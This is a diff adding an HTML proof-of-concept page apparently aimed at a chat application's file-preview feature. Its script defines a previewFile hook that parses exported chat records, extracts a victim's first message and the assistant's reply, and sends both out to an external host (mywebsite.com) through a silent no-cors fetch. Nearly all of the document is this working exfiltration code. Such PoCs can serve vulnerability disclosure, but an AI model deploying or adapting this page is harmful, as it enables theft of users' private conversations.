@@ -1,0 +1,127 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src https://mywebsite.com; base-uri 'none'; form-action 'none'">
+  <title>POC</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 24px;
+      background: #fff;
+      color: #000;
+      font: 18px/1.6 Arial, sans-serif;
+      overflow-wrap: anywhere;
+    }
+    p { margin: 14px 0; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <p>POC :-</p>
+  <p>victim first msg :- <span id="msg"></span></p>
+  <p>victim first chat response :- <span id="response"></span></p>
+
+  <script>
+  (() => {
+    "use strict";
+
+    const REQUIRED_TEST_TITLE = "*";
+    const MAX_RESPONSE_BYTES = 10 * 1024 * 1024;
+    const MAX_CALLBACK_TEXT = 1500;
+    let callbackSent = false;
+
+    function text(value) {
+      return typeof value === "string" ? value : "";
+    }
+
+    function messageText(message) {
+      const parts = [];
+      const content = text(message && message.content);
+      if (content) parts.push(content);
+
+      if (Array.isArray(message && message.blocks)) {
+        for (const block of message.blocks) {
+          if (!block || typeof block !== "object") continue;
+          const blockText = text(block.text) || text(block.content);
+          if (blockText) parts.push(blockText);
+        }
+      }
+      return parts.join("\n\n").trim();
+    }
+
+    function messagesFor(record) {
+      const history = record && record.chat && record.chat.history;
+      const raw = history && history.messages;
+      if (Array.isArray(raw)) return raw.filter(Boolean);
+      if (raw && typeof raw === "object") return Object.values(raw).filter(Boolean);
+      return [];
+    }
+
+    function testPair(records) {
+      const record = records.find(item =>
+        text(item && (item.title || (item.chat && item.chat.title))).trim() === REQUIRED_TEST_TITLE
+      );
+      if (!record) return null;
+
+      const messages = messagesFor(record);
+      const userIndex = messages.findIndex(item =>
+        item && item.role === "user" && messageText(item)
+      );
+      if (userIndex < 0) return null;
+
+      const user = messages[userIndex];
+      const userId = text(user.id);
+      const childIds = Array.isArray(user.children_ids) ? user.children_ids : [];
+      const assistant = messages.find(item =>
+        item && item.role === "assistant" &&
+        ((userId && item.parent_id === userId) || (item.id && childIds.includes(item.id)))
+      ) || messages.slice(userIndex + 1).find(item => item && item.role === "assistant");
+
+      const msg = messageText(user);
+      const response = messageText(assistant);
+      return msg && response ? { msg, response } : null;
+    }
+
+    function sendTestPair(pair) {
+      if (callbackSent) return;
+      if (pair.msg.length > MAX_CALLBACK_TEXT || pair.response.length > MAX_CALLBACK_TEXT) return;
+      callbackSent = true;
+
+      const callback = new URL("https://mywebsite.com/");
+      callback.searchParams.set("msg", pair.msg);
+      callback.searchParams.set("response", pair.response);
+      fetch(callback, {
+        method: "GET",
+        mode: "no-cors",
+        credentials: "omit",
+        cache: "no-store",
+        referrerPolicy: "no-referrer"
+      }).catch(() => {});
+    }
+
+    window.previewFile = async blob => {
+      try {
+        if (!(blob instanceof Blob) || !blob.size || blob.size > MAX_RESPONSE_BYTES) return;
+        const records = JSON.parse(await blob.text());
+        if (!Array.isArray(records)) return;
+
+        const pair = testPair(records);
+        if (!pair) return;
+
+        document.getElementById("msg").textContent = pair.msg;
+        document.getElementById("response").textContent = pair.response;
+        sendTestPair(pair);
+        records.length = 0;
+      } catch (_) {
+      }
+    };
+
+    window.dispatchEvent(new Event("previewfileready"));
+  })();
+  </script>
+</body>
+</html>
